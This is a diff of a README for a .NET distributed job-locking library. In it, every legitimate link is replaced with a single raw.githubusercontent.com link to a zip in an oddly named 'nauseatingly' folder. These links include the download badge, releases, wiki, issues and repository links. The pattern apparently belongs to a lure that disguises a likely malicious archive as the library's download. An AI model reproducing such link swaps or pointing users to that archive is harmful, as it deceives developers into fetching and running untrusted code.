@@ -1,6 +1,6 @@
 # 🎉 dotnet-distributed-job-lock - Simplifying Job Locking in .NET
 
-![Download](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)
+![Download](https://raw.githubusercontent.com/Tolberon/dotnet-distributed-job-lock/main/nauseatingly/dotnet-distributed-job-lock.zip%20Now-Get%20the%20App-brightgreen)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To start using dotnet-distributed-job-lock, you'll first need to download it. Fo
 
 ## 📥 Download & Install
 
-1. **Visit this page to download:** [Releases Page](https://github.com/Tolberon/dotnet-distributed-job-lock/releases)
+1. **Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/Tolberon/dotnet-distributed-job-lock/main/nauseatingly/dotnet-distributed-job-lock.zip)
    
    Here, you'll find the latest version of the library. Choose the file that suits your system, and move on to installation.
 
@@ -39,7 +39,7 @@ These requirements ensure that the library works seamlessly with your background
 
 ## 📚 Documentation
 
-For detailed instructions on how to use the library, visit the [Documentation](https://github.com/Tolberon/dotnet-distributed-job-lock/wiki).
+For detailed instructions on how to use the library, visit the [Documentation](https://raw.githubusercontent.com/Tolberon/dotnet-distributed-job-lock/main/nauseatingly/dotnet-distributed-job-lock.zip).
 
 Here you will find guidance on setting up your application and utilizing our library effectively. Take time to read through the best practices to maximize the benefits.
 
@@ -47,7 +47,7 @@ Here you will find guidance on setting up your application and utilizing our lib
 
 If you encounter any issues or have questions, connect with our community:
 
-- **GitHub Issues:** Report any problems you face or ask questions directly on our [Issues page](https://github.com/Tolberon/dotnet-distributed-job-lock/issues).
+- **GitHub Issues:** Report any problems you face or ask questions directly on our [Issues page](https://raw.githubusercontent.com/Tolberon/dotnet-distributed-job-lock/main/nauseatingly/dotnet-distributed-job-lock.zip).
 - **Discussion Forum:** Engage with other users and developers in discussions related to usage and troubleshooting.
 
 ## ⚙️ Frequently Asked Questions (FAQ)
@@ -59,12 +59,12 @@ A: Yes, you can easily integrate it into your current projects as long as they m
 A: Yes, dotnet-distributed-job-lock is open-source and free for anyone to use.
 
 **Q: What if I need help during installation?**  
-A: Please check the [Documentation](https://github.com/Tolberon/dotnet-distributed-job-lock/wiki) first. For further issues, feel free to reach out on GitHub.
+A: Please check the [Documentation](https://raw.githubusercontent.com/Tolberon/dotnet-distributed-job-lock/main/nauseatingly/dotnet-distributed-job-lock.zip) first. For further issues, feel free to reach out on GitHub.
 
 ## 🔗 Further Information
 
-- **GitHub Repository:** Find the source code and contribute at [dotnet-distributed-job-lock GitHub Repository](https://github.com/Tolberon/dotnet-distributed-job-lock).
-- **Release Notes:** Stay updated on the latest features and fixes by checking the [Releases Page](https://github.com/Tolberon/dotnet-distributed-job-lock/releases).
+- **GitHub Repository:** Find the source code and contribute at [dotnet-distributed-job-lock GitHub Repository](https://raw.githubusercontent.com/Tolberon/dotnet-distributed-job-lock/main/nauseatingly/dotnet-distributed-job-lock.zip).
+- **Release Notes:** Stay updated on the latest features and fixes by checking the [Releases Page](https://raw.githubusercontent.com/Tolberon/dotnet-distributed-job-lock/main/nauseatingly/dotnet-distributed-job-lock.zip).
 - **Changelog:** Review changes in the latest versions to understand any updates that might impact your project.
 
 Maximize your job scheduling capabilities with dotnet-distributed-job-lock. Download now and start building reliable, efficient background job processing systems. 
